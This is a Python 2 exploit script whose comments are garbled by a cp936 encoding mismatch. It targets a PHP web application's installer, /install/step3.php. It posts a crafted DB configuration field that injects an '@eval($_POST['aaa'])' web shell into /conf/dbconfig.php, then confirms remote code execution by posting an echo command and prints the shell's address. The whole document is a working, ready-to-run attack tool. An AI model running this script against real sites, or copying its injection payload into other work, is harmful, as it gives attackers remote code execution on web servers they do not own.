# -*- coding: cp936 -*-

import urllib

import urllib2

Url = str(raw_input("������վ(ֻ������������):"))

#�Զ���Shell����(���Ҫ�Զ�������Shell���� �������޸����´���)

#Key = str(raw_input("����Shell����:"))

#GetShell������

def GetShell(Url):
    
#������
    
    try:
        
        #���͵�Post����
        
        test_data = {"DB_HOST":"localhost","Shell":" '); @eval ($_POST['aaa']);//"}

        #test_data = {"DB_HOST":"localhost","Shell":" '); @eval ($_POST['"+Key+"']);//"}

        test_data_urlencode = urllib.urlencode(test_data)

        #Url��ַ

        requrl = "http://"+Url+"/install/step3.php"

        req = urllib2.Request(url = requrl,data =test_data_urlencode)

        res_data = urllib2.urlopen(req,timeout=5)

        #������֤���������Ƿ�д��ɹ�

        Inspect(Url)

        #������

    except:

        print "��������ʧ�� �������������Ƿ�����"

#��֤GetShell�Ƿ�ɹ�

def Inspect(Url):

    #��������

    test_data = {"aaa":"echo '233';"}

    #�Զ�������

    #test_data = {""+Key+"":"echo '233';"}

    test_data_urlencode = urllib.urlencode(test_data)

    #Url��ַ

    requrl = "http://"+Url+"/conf/dbconfig.php"

    req = urllib2.Request(url = requrl,data =test_data_urlencode)

    res_data = urllib2.urlopen(req,timeout=15)

    #��ȡҳ��Դ��

    Html = res_data.read()

    if (Html=="233"):

        print "Shell��ַ:"+"http://"+Url+"/conf/dbconfig.php"

    else: 

        print "©�����޸� �޷�����"

GetShell(Url)
